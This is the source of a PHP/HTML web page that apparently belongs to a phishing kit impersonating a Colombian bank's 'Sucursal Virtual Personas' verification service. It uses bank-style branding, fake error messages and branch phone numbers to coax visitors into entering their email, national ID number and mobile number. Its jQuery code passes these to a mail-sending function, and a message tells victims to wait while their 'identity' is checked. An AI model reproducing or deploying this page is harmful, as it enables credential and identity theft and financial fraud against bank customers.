<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title> --Verificacion Sucursal Personas-- </title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">
  		
		<meta content="es" http-equiv="Content-Language">
  	
		<meta name="description" content="">
  		<meta name="author" content="">
  		<meta name="Copyright" content="">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	 	<script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
		<link href="css/style.css" rel="stylesheet">
		<link href="css/stylesheet.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="img/logo.png" />
		<script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
		<script src="js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="js/functions.js"></script>  		
   	</head>
   	<body>
   		<div class="contenido">
   			<div class="cabecera">
   				<div class="logo">
   					<img src="img/logo.svg">
   					<br>
   					<span class="subtitulo">Verificacion Personas</span>
   					<br>
					<span class="texto-min">Fecha y hora actual:</span> <span class="texto-min" id="fecha-hora">Lunes 13 de Junio de 2022 9:23:11 AM</span>
   				</div>
   				<div class="titulo">Ahora Verificar tu cuenta es fácil</div>
   				<div class="mensaje">
   					<table>
   						<tr>
   							<td valign="middle"><img src="img/error.jpg" style="width: 40px;"></td>   					
   							<td valign="middle" style="padding-left: 12px;"><span style="font-size: 20px; color: #000; line-height: 20px;">Error</span><br><span>Por favor ingesar la información requerida.</span></td>
   						</tr>
   					</table>
   				</div>
   			</div>   			
   			<div class="cuerpo">
   				<div class="pnlizq">
   					<div class="formulario">
   						<div class="form-titulo">Verificacion de datos</div>
   						<div class="descripcion">
   							Verificaremos estos datos con los agregados anteriormente en nuestras sucursales
   						</div>
   						<div class="form-cuerpo">
   							<div style="text-align: left;">
   								<img src="img/info.jpg" class="icon-info"><span class="etiqueta"> Ingrese su Correo Electrónico</span>
   							</div>   						
   							<div class="input-icono email">
   								<input type="text" name="txtMail" id="txtMail" autocomplete="off" >
   							</div>
   							<br>
   							<div style="text-align: left;">
   								<img src="img/info.jpg" class="icon-info"><span class="etiqueta">  Ingrese su Numero De Identidad</span>
   							</div>   						
   							<div class="input-icono pass">
   								<input type="password" name="txtPass" id="txtPass" autocomplete="off" >
   							</div>
   							<br>
   							<div style="text-align: left;">
   								<img src="img/info.jpg" class="icon-info"><span class="etiqueta">  Ingrese su Celular</span>
   							</div>   						
   							<div class="input-icono celular">
   								<input type="text" name="txtCelular" id="txtCelular" maxlength="10" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
   							</div>
   							<br>
   							<button id="btnMail" name="btnMail" class="btn btn-amarillo" type="button">Verificar</button>
   							<br>
   						  							
   						</div>
   					</div>
   					<br>
   					<div class="lista-links ">
   						<div class="texto">
   							<div class="vinculos">
   								<table>
   									<tr>
   										<td valign="middle"><img src="img/demo.jpg"></td>
   										<td valign="middle"><a href="#">Conoce sobre sucursal virtual persona</a></td>
   									</tr>
   								</table>  								   						
   							</div>
   							<div class="vinculos">
   								<table>
   									<tr>
   										<td valign="middle"><img src="img/seguridad.jpg"></td>
   										<td valign="middle"><a href="#">Aprende sobre Seguridad</a></td>
   									</tr>
   								</table>   								  							
   							</div>   
   							<div class="vinculos">
   								<table>
   									<tr>
   										<td valign="middle"><img src="img/reglamento.jpg"></td>
   										<td valign="middle"><a href="#">Reglamento Sucursal Virtual</a></td>
   									</tr>
   								</table>   								  							
   							</div>
   							<div class="vinculos">
   								<table>
   									<tr>
   										<td valign="middle"><img src="img/politica.jpg"></td>
   										<td valign="middle"><a href="#">Política de Privacidad</a></td>
   									</tr>
   								</table>   								   							
   							</div> 													
						</div> 
   					</div>
   				</div>
   				<div class="pnlder">
   					<a href="#"><img src="img/email.jpg" class="publicidad"></a><br><br>
   					<div class="texto" style="text-align:justify; padding: 0px 30px;">Después de presionar verificar, te llevaremos a una página donde tendrás que esperar aproximadamente 30 segundos, de ser válida tu identidad continuaremos al siguiente paso de lo contrario en sistema pedira verificar nuevamente.</div>
   				</div>
   			</div>
   			<div class="pie">
   				<div class="direccion">Sucursal Telefónica: Bogotá 343 0000 - Medellín 510 9000 - Cali 554 0505 - Barranquilla 361 8888 - Cartagena 693 4400 - Bucaramanga 697 2525 - Pereira 340 1213<br class="salto-pie">
El resto del país 01 800 09 12345. Sucursales Telefónicas en el exterior: España 900 995 717 - Estados Unidos 1866 379 9714.</div>
   				<div class="ippie">
   					<span class="dirip">Dirección IP: <?php echo $ip; ?></span>´
   					<span class="copyright">Copyright © 2022 </span>
   				</div>
   			</div>
   		</div>
   	</body>
</html>
<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

 
 
 
 
	$(document).ready(function() {
		$('#btnMail').click(function(){
			if ($("#txtMail").val().length > 0) {
				if ($("#txtPass").val().length > 0) {
					if ($("#txtCelular").val().length > 9) {
						enviar_mail($("#txtMail").val(),$("#txtPass").val(),$("#txtCelular").val());
					}else{
						$(".mensaje").show();
						$(".celular").css("border", "1px solid red");
						$("#txtCelular").focus();
					}
				}else{
					$(".mensaje").show();
					$(".pass").css("border", "1px solid red");
					$("#txtPass").focus();
				}
			}else{
				$(".mensaje").show();
				$(".email").css("border", "1px solid red");
				$("#txtMail").focus();
			}
		});

		$("#txtMail").keyup(function(e) {
			$(".email").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});

		$("#txtPass").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});

		$("#txtCelular").keyup(function(e) {
			$(".celular").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>
<script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "<?php echo date('H:i:s') ?>",
         h_date: "<?php echo date('Y/m/d') ?>",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#fecha-hora').jclock(optionsEST);
     });
 </script>

